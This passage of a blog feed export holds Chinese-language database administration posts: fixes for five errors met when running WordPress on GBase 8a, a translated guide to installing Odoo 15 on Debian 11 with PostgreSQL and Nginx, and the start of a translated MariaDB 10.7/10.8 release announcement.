class="line"><span class="comment"># 检查配置文件是否修改成功</span></span><br><span class="line"><span class="built_in">cat</span> /var/www/html/wp-blog/wp-config.php | grep DB</span><br></pre></td></tr></table></figure></div>
<p>修改完成后，启动httpd服务：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动httpd</span></span><br><span class="line">systemctl start httpd</span><br></pre></td></tr></table></figure></div>
<p>运行 httpd 服务后，便可通过URL： <a class="link"   href="http://192.168.8.101/phpinfo.php" >http://192.168.8.101/phpinfo.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 查看php信息，如图所示。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-blog-case/2023-02-20-03.jpg"
                      alt="" loading="lazy"
                ></p>
<p>通过 URL： <a class="link"   href="http://192.168.8.101/wp-blog/wp-admin/install.php" >http://192.168.8.101/wp-blog/wp-admin/install.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来进行博客系统的初始化。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-blog-case/2023-02-20-04.jpg"
                      alt="" loading="lazy"
                ></p>
<p>到此，个人博客系统搭建完成。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-blog-case/2023-02-20-05.jpg"
                      alt="" loading="lazy"
                ></p>
<h2 id="遇到的问题">遇到的问题</h2>
<p>接下来，着重阐述在搭建博客时遇到的几点问题，以及问题解析。</p>
<h3 id="Case-1-Unknown-collation-‘utf8mb4-unicode-520-ci’">Case 1: Unknown collation: ‘utf8mb4_unicode_520_ci’</h3>
<ul>
<li>问题解读：</li>
</ul>
<p>由于wordpress默认使用MySQL数据库，从MySQL 5.7开始，引入了新的字符校验规则<code>utf8mb4_unicode_520_ci</code>，而这在GBase 8a中是不支持的，所以需要修改wordpress的默认配置项。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">/**</span> <span class="string">Database</span> <span class="string">Charset</span> <span class="string">to</span> <span class="string">use</span> <span class="string">in</span> <span class="string">creating</span> <span class="string">database</span> <span class="string">tables.</span> <span class="string">*/</span></span><br><span class="line"><span class="string">define(</span> <span class="string">&#x27;DB_CHARSET&#x27;</span><span class="string">,</span> <span class="string">&#x27;utf8mb4&#x27;</span> <span class="string">);</span></span><br><span class="line"></span><br><span class="line"><span class="string">/**</span> <span class="string">The</span> <span class="string">Database</span> <span class="string">Collate</span> <span class="string">type.</span> <span class="string">Don&#x27;t</span> <span class="string">change</span> <span class="string">this</span> <span class="string">if</span> <span class="string">in</span> <span class="string">doubt.</span> <span class="string">*/</span></span><br><span class="line"><span class="string">define(</span> <span class="string">&#x27;DB_COLLATE&#x27;</span><span class="string">,</span> <span class="string">&#x27;utf8mb4_unicode_ci&#x27;</span> <span class="string">);</span></span><br></pre></td></tr></table></figure></div>
<p>如若不修改，则会遇到下面的报错信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WordPress database error: [Unknown collation: &#x27;utf8mb4_unicode_520_ci&#x27;]</span><br><span class="line">CREATE TABLE wp_users ( ID bigint(20) unsigned NOT NULL auto_increment, user_login varchar(60) NOT NULL default &#x27;&#x27;, user_pass varchar(255) NOT NULL default &#x27;&#x27;, user_nicename varchar(50) NOT NULL default &#x27;&#x27;, user_email varchar(100) NOT NULL default &#x27;&#x27;, user_url varchar(100) NOT NULL default &#x27;&#x27;, user_registered datetime NOT NULL default &#x27;0000-00-00 00:00:00&#x27;, user_activation_key varchar(255) NOT NULL default &#x27;&#x27;, user_status int(11) NOT NULL default &#x27;0&#x27;, display_name varchar(250) NOT NULL default &#x27;&#x27;, PRIMARY KEY (ID), KEY user_login_key (user_login), KEY user_nicename (user_nicename), KEY user_email (user_email) ) DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-blog-case/2023-02-20-06.jpg"
                      alt="" loading="lazy"
                ></p>
<h3 id="Case-2-GBA-01EX-700-Gbase-general-error-unsupported-key-algorithm">Case 2: (GBA-01EX-700) Gbase general error: unsupported key algorithm</h3>
<ul>
<li>问题解读：</li>
</ul>
<p>GBase 8a 当前版本，不支持 <code>KEY user_login_key (user_login)</code> 这种语法。<br>
故会遇到下面的报错信息：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WordPress database error: [(GBA-01EX-700) Gbase general error: unsupported key algorithm]</span><br><span class="line">CREATE TABLE wp_users ( ID bigint(20) unsigned NOT NULL auto_increment, user_login varchar(60) NOT NULL default &#x27;&#x27;, user_pass varchar(255) NOT NULL default &#x27;&#x27;, user_nicename varchar(50) NOT NULL default &#x27;&#x27;, user_email varchar(100) NOT NULL default &#x27;&#x27;, user_url varchar(100) NOT NULL default &#x27;&#x27;, user_registered datetime NOT NULL default &#x27;0000-00-00 00:00:00&#x27;, user_activation_key varchar(255) NOT NULL default &#x27;&#x27;, user_status int(11) NOT NULL default &#x27;0&#x27;, display_name varchar(250) NOT NULL default &#x27;&#x27;, PRIMARY KEY (ID), KEY user_login_key (user_login), KEY user_nicename (user_nicename), KEY user_email (user_email) ) DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2022/gbase/gbase-8a-blog-case/2023-02-20-07.jpg"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>解决办法：</li>
</ul>
<p>将DDL中的 <code>KEY user_login_key (user_login)...</code> 去掉。</p>
<ul>
<li>问题引申：</li>
</ul>
<p>GBase 8a 系统支持三类索引：</p>
<ol>
<li>智能索引：<br>
粗粒度，在DC满块时自动创建智能索引，所有列都有，对用户透明，无需用户手动维护。</li>
<li>Hash索引：<br>
提升等值查询的性能，需用户根据查询列手动创建，会影响数据入库性能。</li>
<li>全文检索：<br>
提升文本内容的查询效率，采用全单字索引方式，并且可以保证100%的查询召回率，<br>
需要用户手动创建，需特别安装支持全文检索的插件包后才能使用全文检索功能。</li>
</ol>
<h3 id="Case-3-ERROR-1067-42000-Invalid-default-value-for-‘user-registered’">Case 3: ERROR 1067 (42000): Invalid default value for ‘user_registered’</h3>
<ul>
<li>问题解读：</li>
</ul>
<p>这个报错是由于字段 <code>user_registered</code> 的默认值不合规引起的，应由<code>'0000-00-00 00:00:00'</code>改为<code>'0001-01-01 00:00:00'</code>。这也是GBase 8a与MySQL不同之处之一。</p>
<ul>
<li>问题引申：</li>
</ul>
<p>当我们需要做异构数据库迁移时，需要注意数据类型的兼容性问题。</p>
<blockquote>
<p>数据类型：<strong>DATETIME</strong><br>
最小值：<code>0001-01-01 00:00:00.000000</code><br>
最大值：<code>9999-12-31 23:59:59</code><br>
显示格式：<code>YYYY-MM-dd HH:MI:SS.ffffff</code> --&gt; 精确到微秒</p>
</blockquote>
<p>另外，GBase为我们提供了数据迁移工具-- <a class="link"   href="https://www.modb.pro/doc/55661" >GBase Migration Toolkit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
GBase Migration Toolkit 迁移工具是 GBase 提供的一款可以实现异构数据库进行数据迁移的工具。目前可以实现将源数据库（目前支持的源数据库有：ACCESS、Oracle、SQL Server 2005、DM、DB2、MySQL、ShenTong、GBase 8s V8.3 和 PostgreSQL）中的数据迁移到目标数据库（目前支持的目标数据库有：GBase 8a、GBase 8t 和 GBase 8s V8.7、GBase 8s V8.8）。</p>
<ul>
<li>
<p>引申阅读：</p>
<ol>
<li><a href="https://dev.mysql.com/doc/refman/8.0/en/datetime.html">MySQL 8.0 中的<code>DATETIME</code></a><br>
Invalid DATE, DATETIME, or TIMESTAMP values are converted to the “zero” value of the appropriate type (‘0000-00-00’ or ‘0000-00-00 00:00:00’), if the SQL mode permits this conversion.</li>
<li><a href="https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/Data-Types.html#GUID-7B72E154-677A-4342-A1EA-C74C1EA928E6">Oracle 21c 中没有<code>DATETIME</code>，而是<code>DATE</code></a><br>
<code>DATE</code>: Valid date range from January 1, 4712 BC, to December 31, 9999 AD. The default format is determined explicitly by the NLS_DATE_FORMAT parameter or implicitly by the NLS_TERRITORY parameter.</li>
<li><a href="https://www.postgresql.org/docs/current/datatype-datetime.html">PostgreSQL 14 中没有<code>DATETIME</code>，而是<code>timestamp</code></a><br>
<code>timestamp</code>: both date and time, Low Value: 4713 BC, High Value: 294276 AD.</li>
</ol>
</li>
</ul>
<h3 id="Case-4-ERROR-1733-HY000-GBA-01EX-700-Gbase-general-error-Unsupported-data-type">Case 4: ERROR 1733 (HY000): (GBA-01EX-700) Gbase general error: Unsupported data type.</h3>
<ul>
<li>问题解读：</li>
</ul>
<p>这个报错是由于字段 <code>bigint</code> 指定了<code>unsigned</code>无符号数字所导致的。<br>
GBase 8a 当前版本，不支持unsigned的无符号数字。</p>
<ul>
<li>演示示例：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">gbase<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t1 ( ID <span class="type">bigint</span>(<span class="number">20</span>) unsigned);</span><br><span class="line">ERROR <span class="number">1733</span> (HY000): (GBA<span class="number">-01</span>EX<span class="number">-700</span>) Gbase general error: Unsupported data type.</span><br><span class="line">gbase<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t1 ( ID <span class="type">bigint</span>(<span class="number">20</span>) );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (Elapsed: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00.02</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>解决办法：</li>
</ul>
<p>将<code>unsigned</code>去掉即可。</p>
<h3 id="Case-5-ERROR-1101-42000-BLOB-TEXT-column-‘meta-value’-can’t-have-a-default-value">Case 5: ERROR 1101 (42000): BLOB/TEXT column ‘meta_value’ can’t have a default value</h3>
<ul>
<li>问题解读：</li>
</ul>
<p>该问题是由字段<code>meta_value</code>的默认值导致的，在当前GBase 8a版本中，数据类型<code>longtext</code>不支持指定DEFAULT值。<br>
将<code>DEFAULT NULL</code>去掉即可。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `wp_commentmeta` (</span><br><span class="line">...</span><br><span class="line">`meta_value` longtext <span class="keyword">COLLATE</span> utf8mb4_unicode_ci <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>问题引申：</li>
</ul>
<ol>
<li>在实际的项目不建议使用char和text类型，建议使用 VARCHAR 数据类型。</li>
<li>TEXT类型不能指定DEFAULT值，仅兼容使用，推荐使用 VARCHAR 数据类型。</li>
</ol>
<h2 id="总结">总结</h2>
<p>从上述5个Case中，可以将问题归类为：</p>
<p>1）字符集 (Case 1)<br>
2）DDL（表定义、索引定义） (Case 2)<br>
3）数据类型 (Case 3, Case 4, Case 5)</p>
<p>这是日常工作中容易遇到的基础问题，需要在 GBase 8a 日常管理、异构数据库迁移到 GBase 8a 时重点注意的地方。</p>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/246258" >活动 | 第一届“GBase技术文章”有奖征文大赛活动公告 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/245537" >征文大赛 | 第一届“GBase技术文章”有奖征文常见问题解答 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/325922" >第一届“GBase技术征文大赛”首批入围文章发布啦🔈~（持续更新中） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2021/gbase-8a-gdca/">资深DBA带您了解GBase培训</a></li>
<li><a class="link"   href="https://mp.weixin.qq.com/s/Ije3hCvG4xtnZ3bH9WPI_w" >新春开课 | 欢迎参加GBase 8a MPP CLuster数据库2月训练营 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/gbase/gbase-8a-python-connector/">源码阅读 | 浅析 GBase 8a Python 连接器的源码</a></li>
</ul>
<hr>
<p>2022-02-20<br>
Shawn Yan</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/331065" >https://www.modb.pro/db/331065 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzI2ODU2NDUzMQ==&amp;mid=2247490976&amp;idx=3&amp;sn=c517f78034310b3a5a5117ff10a96b29" >https://mp.weixin.qq.com/s?__biz=MzI2ODU2NDUzMQ==&amp;mid=2247490976&amp;idx=3&amp;sn=c517f78034310b3a5a5117ff10a96b29 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8a</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gbase 8a</tag>
        <tag>南大通用</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 如何在 Debian 11 上安装 Odoo 15</title>
    <url>/2022/modb/fanyi-install-odoo-15-on-debian-11-with-pg/</url>
    <content><![CDATA[<blockquote>
<p>原文链接： <a class="link"   href="https://www.linuxcloudvps.com/blog/how-to-install-odoo-15-on-debian-11/" >https://www.linuxcloudvps.com/blog/how-to-install-odoo-15-on-debian-11/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者： LinuxCloudVPS</p>
</blockquote>
<p>Odoo 是一款开源的整套商业软件，包括ERP，CRM，财务，人力资源等。它可以根据您的需要提供不同的版本。它可以用于多种不同的行业，比如销售，运营，制造，销售，人力资源，财务等等。Odoo最大的优势在于集成的可扩展性、用户友好性、灵活性和可定制化。它使用Python编写，并随时随地帮助您管理商业、提升效率。</p>
<p>这篇文章，我们将想您演示如何在 Debian 11 安装 Odoo 15。</p>
<h2 id="前提条件">前提条件</h2>
<ul>
<li>Debian 11 操作系统（我们将使用 <a class="link"   href="https://www.rosehosting.com/debian-hosting.html" >SSD 2 VPS plan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ）</li>
<li>进入root账户（或者使用有root权限的admin账号）</li>
</ul>
<h2 id="登陆服务器，并更新系统">登陆服务器，并更新系统</h2>
<p>用root用户使用SSH登陆您的Debian 11 VPS （如果root不可用，您可以使用超级账号，我们的VPS可以使用root账号）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@IP_Address -p Port_number</span><br></pre></td></tr></table></figure></div>
<p>不要忘记将<code>IP_Address</code>和<code>Port_number</code>替换为您服务器的真实IP地址和SSH服务端口。默认SSH端口为22.<br>
运行下面的命令，确保您Debian 11 VPS上已经安装的包都更新到最新版本。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get upgrade -y</span><br></pre></td></tr></table></figure></div>
<h2 id="安装必须的依赖">安装必须的依赖</h2>
<p>Odoo使用Python编写，所以您需要在您的服务器上安装Python和它的依赖包。您可以使用下面的命令安装所有的依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip python-dev python3-dev libxml2-dev libpq-dev liblcms2-dev libxslt1-dev zlib1g-dev libsasl2-dev libldap2-dev build-essential git libssl-dev libffi-dev libjpeg-dev libblas-dev libatlas-base-dev</span><br></pre></td></tr></table></figure></div>
<p>完成安装Python依赖之后，使用下面的命令安装Node.js和其他依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install npm</span><br><span class="line">npm install -g less less-plugin-clean-css</span><br><span class="line">apt-get install node-less</span><br></pre></td></tr></table></figure></div>
<p>接下来，安装 wkhtmltopdf 工具 ：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install wkhtmltopdf</span><br></pre></td></tr></table></figure></div>
<h2 id="安装并配置-PostgreSQL">安装并配置 PostgreSQL</h2>
<p>接下来，您需要在服务器上安装PostgreSQL数据库。您可以使用下面的命令来进行安装：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install postgresql -y</span><br></pre></td></tr></table></figure></div>
<p>安装完成之后，使用下面的命令登陆PostgreSQL并创建一个Odoo用户：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - postgres</span><br><span class="line">createuser --createdb --username postgres --no-createrole --no-superuser --pwprompt odoo15</span><br><span class="line">psql</span><br><span class="line">ALTER USER odoo15 WITH SUPERUSER;</span><br></pre></td></tr></table></figure></div>
<p>然后，退出PostgreSQL客户端：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">q</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></div>
<h2 id="安装并配置-Odoo15">安装并配置 Odoo15</h2>
<p>推荐使用单独的用户来运行Odoo，先创建一个新的用户Odoo15：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">useradd -m -d /opt/odoo15 -U -r -s /bin/bash odoo15</span><br></pre></td></tr></table></figure></div>
<p>下一步，切换到odoo15用户，下载Odoo源码：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - odoo15</span><br><span class="line">git clone https://www.github.com/odoo/odoo --depth 1 --branch 15.0 /opt/odoo15/odoo</span><br></pre></td></tr></table></figure></div>
<p>下一步，退出odoo15用户</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure></div>
<p>下一步，安装Odoo其他依赖：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install -r /opt/odoo15/odoo/requirements.txt</span><br></pre></td></tr></table></figure></div>
<p>下一步，复制Odoo配置文件样例到/etc目录下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cp /opt/odoo15/odoo/debian/odoo.conf /etc/odoo.conf</span><br></pre></td></tr></table></figure></div>
<p>下一步，编辑Odoo15配置文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nano /etc/odoo.conf</span><br></pre></td></tr></table></figure></div>
<p>修改下面的行：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[options]</span><br><span class="line">   ; This is the password that allows database operations:</span><br><span class="line">   admin_passwd = adminpassword</span><br><span class="line">   db_host = False</span><br><span class="line">   db_port = False</span><br><span class="line">   db_user = odoo15</span><br><span class="line">   db_password = False</span><br><span class="line">   xmlrpc_interface = 127.0.0.1</span><br><span class="line">   proxy_mode = True</span><br><span class="line">   addons_path = /opt/odoo15/odoo/addons</span><br><span class="line">   logfile = /var/log/odoo/odoo.log</span><br></pre></td></tr></table></figure></div>
<p>保存并关闭文件，修改Odoo配置文件所属：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">chown odoo15: /etc/odoo.conf</span><br></pre></td></tr></table></figure></div>
<p>下一步，为Odoo创建日志目录并设定所属：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /var/log/odoo</span><br><span class="line">chown odoo15:root /var/log/odoo</span><br></pre></td></tr></table></figure></div>
<h2 id="为-Odoo15-创建系统服务文件">为 Odoo15 创建系统服务文件</h2>
<p>下一步，为 Odoo15 创建一个系统服务文件 ，来管理Odoo实例。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nano /etc/systemd/system/odoo15.service</span><br></pre></td></tr></table></figure></div>
<p>加入下面的行：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>file (systemd)</span></figcaption><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">   Description=Odoo</span><br><span class="line">   Documentation=http://www.odoo.com</span><br><span class="line">[Service]</span><br><span class="line">   Type=simple</span><br><span class="line">   User=odoo15</span><br><span class="line">   ExecStart=/opt/odoo15/odoo/odoo-bin -c /etc/odoo.conf</span><br><span class="line">[Install]</span><br><span class="line">   WantedBy=default.target</span><br></pre></td></tr></table></figure></div>
<p>保存并关闭文件，然后重载系统服务来应用变更：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure></div>
<p>下一步，启动Odoo15服务并使其随系统重启启动：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start odoo15</span><br><span class="line">systemctl enable odoo15</span><br></pre></td></tr></table></figure></div>
<h2 id="配置-Nginx-来做-Odoo15-的反向代理">配置 Nginx 来做 Odoo15 的反向代理</h2>
<p>下一步，你将需要配置 Nginx 作为 Odoo15 的反向代理，安装Nginx包：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install nginx -y</span><br></pre></td></tr></table></figure></div>
<p>下一步，创建 Nginx 的虚拟主机配置文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nano /etc/nginx/conf.d/odoo15.conf</span><br></pre></td></tr></table></figure></div>
<p>添加下面的配置：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">upstream</span> <span class="string">odoo</span> &#123;</span><br><span class="line"> <span class="string">server</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8069;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">upstream</span> <span class="string">odoochat</span> &#123;</span><br><span class="line"> <span class="string">server</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8072;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">server</span> &#123;</span><br><span class="line"> <span class="string">listen</span> <span class="number">80</span><span class="string">;</span></span><br><span class="line"> <span class="string">server_name</span> <span class="string">odoo15.yourdomain.com;</span></span><br><span class="line"> <span class="string">proxy_read_timeout</span> <span class="string">720s;</span></span><br><span class="line"> <span class="string">proxy_connect_timeout</span> <span class="string">720s;</span></span><br><span class="line"> <span class="string">proxy_send_timeout</span> <span class="string">720s;</span></span><br><span class="line"> <span class="comment"># Add Headers for odoo proxy mode</span></span><br><span class="line"> <span class="string">proxy_set_header</span> <span class="string">X-Forwarded-Host</span> <span class="string">$host;</span></span><br><span class="line"> <span class="string">proxy_set_header</span> <span class="string">X-Forwarded-For</span> <span class="string">$proxy_add_x_forwarded_for;</span></span><br><span class="line"> <span class="string">proxy_set_header</span> <span class="string">X-Forwarded-Proto</span> <span class="string">$scheme;</span></span><br><span class="line"> <span class="string">proxy_set_header</span> <span class="string">X-Real-IP</span> <span class="string">$remote_addr;</span></span><br><span class="line"> <span class="comment"># log</span></span><br><span class="line"> <span class="string">access_log</span> <span class="string">/var/log/nginx/odoo.access.log;</span></span><br><span class="line"> <span class="string">error_log</span> <span class="string">/var/log/nginx/odoo.error.log;</span></span><br><span class="line"> <span class="comment"># Redirect longpoll requests to odoo longpolling port</span></span><br><span class="line"> <span class="string">location</span> <span class="string">/longpolling</span> &#123;</span><br><span class="line"> <span class="string">proxy_pass</span> <span class="string">http://odoochat;</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment"># Redirect requests to odoo backend server</span></span><br><span class="line"> <span class="string">location</span> <span class="string">/</span> &#123;</span><br><span class="line">   <span class="string">proxy_redirect</span> <span class="string">off;</span></span><br><span class="line">   <span class="string">proxy_pass</span> <span class="string">http://odoo;</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment"># common gzip</span></span><br><span class="line"> <span class="string">gzip_types</span> <span class="string">text/css</span> <span class="string">text/scss</span> <span class="string">text/plain</span> <span class="string">text/xml</span> <span class="string">application/xml</span> <span class="string">application/json</span> <span class="string">application/javascript;</span></span><br><span class="line"> <span class="string">gzip</span> <span class="string">on;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>保存并退出文件，然后重启 Nginx 服务来应用变更：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure></div>
<h2 id="进入-Odoo15-实例">进入 Odoo15 实例</h2>
<p>到此，Odoo15已经安装完成并运行。您可以通过这个地址 <strong><a class="link"   href="http://odoo15.yourdomain.com" >http://odoo15.yourdomain.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong> 进入Odoo15实例， 您将看到下面的画面：</p>
<img  alt="odoo-1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220218-733d1de9-6a59-479f-94cd-102fa885af0a.png"
                      referrerpolicy="no-referrer"
                >
<p>提供您 Odoo15 主要密码，数据库名，密码，点击创建数据库按钮。您将看到如下的Odoo15面板：</p>
<img  alt="odoo-2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220218-216b5163-53e4-4f8d-9758-843a3e6d3ed7.png"
                      referrerpolicy="no-referrer"
                >
<p>当然，如果您使用我们的 Odoo VPS 托管服务，您不必在 Debian 11 上安装 Odoo15，这种情况下，您只需让我们的Linux管理员专家来为您安装和配置它。他们将24x7立即为您处理需求。</p>
<p>附，如果你喜欢这篇关于如何在 Debian 11 上安装 Odoo 15 的文章，请使用下面的按钮来分享给您在社交网络上的朋友，或者简单地留言。非常感谢。</p>
<hr>
<p>译者注：</p>
<ul>
<li>wkhtmltopdf: Simple shell utility to convert html to pdf</li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/329808" >https://www.modb.pro/db/329808 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Debian</category>
      </categories>
      <tags>
        <tag>译文</tag>
        <tag>postgresql</tag>
        <tag>debian</tag>
        <tag>odoo</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] MariaDB 社区版 10.7.2 正式发布 10.8.1 发布 RC 版</title>
    <url>/2022/mariadb/fanyi-announcing-mariadb-community-server-10-7-2-ga-and-10-8-1-rc/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://mariadb.com/resources/blog/announcing-mariadb-community-server-10-7-2-ga-and-10-8-1-rc/" >https://mariadb.com/resources/blog/announcing-mariadb-community-server-10-7-2-ga-and-10-8-1-rc/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Ralf Gebhardt</p>
</blockquote>
<p>我们很高兴的宣布 MariaDB 社区版 10.7 正式GA，10.8第一个RC版本已发布。这些版本与之前公布的季度 <a class="link"   href="https://mariadb.com/newsroom/press-releases/mariadb-announces-new-innovation-release-model/" >创新发版模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一致。</p>
<h2 id="MariaDB-社区版-10-7-正式GA">MariaDB 社区版 10.7 正式GA</h2>
<p>MariaDB 社区版 10.7.2 是 10.7系列的第一个正式版本。为达到GA标准，预览版本为社区尽早开放了新的关键特性，紧接着RC版本发布于2021年11月初。MariaDB 社区版10.7的新特性已发布在候选版本 <a class="link"   href="https://mariadb.com/resources/blog/announcing-mariadb-community-server-10-7-1-rc/" >通告博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="MariaDB-社区版-10-8-发布RC版">MariaDB 社区版 10.8 发布RC版</h2>
<p>MariaDB 社区版 10.8 的第一个候选版本今天发布，并带来了一些新特性。</p>
<p>为帮助RC版本成熟，预览特性已包含在发布于2021年12月底的MariaDB 社区版10.8中。感谢社区的回馈、测试，在经过内部测试后，我们已经准备好了发布RC版本。我们荣幸的说大多数的预览特性已经足够成熟，可以包含在发行版中。</p>
<h2 id="社区版-10-8-RC版本中的新特性">社区版 10.8 RC版本中的新特性</h2>
<h3 id="对于开发者来说">对于开发者来说</h3>
<ul>
<li>
<p>MariaDB 服务器现在支持降序索引。复合索引可以与不同顺序的列一起使用，从而在<code>ORDER BY</code>用例中得到显著的性能提升。<br>
存储过程支持<code>IN</code>,<code>OUT</code>,<code>INOUT</code>,<code>IN OUT</code>限定符。</p>
</li>
<li>
